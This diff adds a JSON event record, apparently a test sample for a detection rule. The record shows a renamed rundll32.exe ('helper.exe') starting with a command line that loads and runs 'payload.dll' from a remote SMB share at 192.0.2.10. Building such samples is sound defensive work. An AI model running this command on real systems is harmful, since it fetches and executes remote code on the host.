@@ -1,0 +1,24 @@
+{
+  "@timestamp": "2026-11-01T10:05:00Z",
+  "event": {
+    "category": [
+      "process"
+    ],
+    "type": [
+      "start"
+    ],
+    "kind": "event"
+  },
+  "host": {
+    "os": {
+      "type": "windows"
+    }
+  },
+  "process": {
+    "name": "helper.exe",
+    "pe": {
+      "original_file_name": "rundll32.exe"
+    },
+    "command_line": "helper.exe \\\\192.0.2.10\\share\\payload.dll,Entry"
+  }
+}
